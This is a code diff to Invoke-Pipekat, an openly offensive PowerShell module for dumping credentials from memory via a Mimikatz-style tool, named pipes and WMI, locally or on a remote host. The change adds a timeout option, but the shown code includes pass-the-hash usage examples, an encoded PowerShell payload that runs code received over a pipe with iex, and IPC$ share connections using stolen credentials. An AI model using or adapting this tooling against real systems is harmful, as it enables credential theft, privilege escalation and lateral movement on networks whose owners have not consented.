@@ -6,7 +6,7 @@ The Invoke-Pipekat module uses Named Pipes and WMI to extract credentials using 
 
 .DESCRIPTION
 
-When you are running as a low-level user but have obtained highly privileged credntials and you want to extract credentials from memory or use any of the features of the famous tool from @gentilkiwi without touching disk or loading from an external source. This uses named pipes to communicate between process and then uses WMI to elevate up on the localhost using the supplied credentials. 
+When you are running as a low-level user but have obtained highly privileged credntials and you want to extract credentials from memory or use any of the features of the famous tool from @gentilkiwi without touching disk or loading from an external source. This uses named pipes to communicate between process and then uses WMI to elevate up on the localhost using the supplied credentials. Default timeout 30seconds.
 
 .EXAMPLE
 
@@ -26,11 +26,12 @@ Invoke-Pipekat -Username Admin -Hash 4E3254E32556AE56AE -Domain . -Command "lsad
 
 .EXAMPLE
 
-Invoke-Pipekat -Target 10.0.0.1 -Username Admin -Hash 4E3254E32556AE56AE -Domain . -Shellcode ZnVuY3Rpb24gSW52b2tlL
+Invoke-Pipekat -Target 10.0.0.1 -Username Admin -Hash 4E3254E32556AE56AE -Domain . -Shellcode ZnVuY3Rpb24gSW52b2tlL -TimeoutMS 15000
 
 #>
-param($Command, $Username, $Password, $Domain, $Hash, $Target, $Shellcode, [bool]$PSexec = $False)
+param($Command, $Username, $Password, $Domain, $Hash, $Target, $Shellcode, [bool]$PSexec = $False, $TimeoutMS)
 
+if(!$TimeoutMS) {$TimeoutMS = 30000}
 if(!$Username) {echo "No username supplied...."; return}
 if(!$Domain) {echo "No domain supplied...."; return}
 if((!$Password) -and (!$Hash)) {echo "No password/hash supplied...."; return}
@@ -170,7 +171,7 @@ add-Type -assembly "System.Core"
 Start-Job -ScriptBlock $scriptblock -ArgumentList @($pipeName,$EncodedData)|Out-Null
 $pi = new-object System.IO.Pipes.NamedPipeClientStream(".", $pipeName);
 
-$pspayloadnamedpipe = "add-Type -assembly `"System.Core`"; `$pi = new-object System.IO.Pipes.NamedPipeClientStream('$pipeName'); `$pi.Connect(); `$pr = new-object System.IO.StreamReader(`$pi); `$t = `$pr.ReadLine(); `$i=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(`$t)); iex `$i; "
+$pspayloadnamedpipe = "add-Type -assembly `"System.Core`"; `$pi = new-object System.IO.Pipes.NamedPipeClientStream('$pipeName'); `$pi.Connect($TimeoutMS); `$pr = new-object System.IO.StreamReader(`$pi); `$t = `$pr.ReadLine(); `$i=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(`$t)); iex `$i; "
 
 $bytes = [System.Text.Encoding]::Unicode.GetBytes($pspayloadnamedpipe)
 $payloadraw = 'cmd /c powershell -v 2 -e '+[Convert]::ToBase64String($bytes)
@@ -204,7 +205,7 @@ IEX $wmicmd
 echo "`n[+] Waiting for output from named pipe.......`n"
 add-Type -assembly "System.Core";
 $pi = new-object System.IO.Pipes.NamedPipeClientStream("$pipeNameMimi"); 
-$pi.Connect(); $pr = new-object System.IO.StreamReader($pi);
+$pi.Connect($TimeoutMS); $pr = new-object System.IO.StreamReader($pi);
 $wp = $pr.ReadLine();
 $pi.Dispose(); $pr.Dispose(); 
 $pl = Decrypt-String -key $pipekey -encryptedStringWithIV $wp
@@ -326,10 +327,10 @@ $net = "net.exe use \\$target\ipc`$ /user:$domain\$username $password"
 IEX $net
 $p = new-object System.IO.Pipes.NamedPipeClientStream($target, $pipeName);
 $w = new-object System.IO.StreamWriter($p)
-$p.Connect(); $w.WriteLine($ed);
+$p.Connect($TimeoutMS); $w.WriteLine($ed);
 $w.Dispose(); $p.Dispose();
 add-Type -assembly "System.Core";$p = new-object System.IO.Pipes.NamedPipeClientStream($target, $pipeNameMimi);
-$p.Connect();$r = new-object System.IO.StreamReader($p);
+$p.Connect($TimeoutMS);$r = new-object System.IO.StreamReader($p);
 $rr=$r.ReadLine();$p.Dispose();$r.Dispose();
 $pl = Decrypt-String -key $pipekey -encryptedStringWithIV $rr 
 $pl
@@ -422,7 +423,7 @@ $net = "net.exe use \\$target\ipc`$ /user:$domain\$username $password"
 IEX $net
 $p = new-object System.IO.Pipes.NamedPipeClientStream($target, $pipeName);
 $w = new-object System.IO.StreamWriter($p)
-$p.Connect(); $w.WriteLine($ed);
+$p.Connect($TimeoutMS); $w.WriteLine($ed);
 $w.Dispose(); $p.Dispose();
 
 }
